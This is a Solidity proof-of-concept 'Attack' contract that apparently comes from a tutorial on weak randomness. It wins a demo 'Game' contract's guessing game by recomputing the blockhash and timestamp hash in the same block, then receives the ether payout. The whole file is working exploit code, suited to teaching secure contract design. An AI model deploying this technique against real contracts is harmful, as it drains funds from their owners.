// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "./Game.sol";

contract Attack {
    Game game;

    // Create an instance of Game contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    // Attack the `Game` contract by guessing the exact number because `blockhash` 
    // and `block.timestamp` are accessible publicly
    function attack() public {
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contract receives ether
    receive() external payable{}
}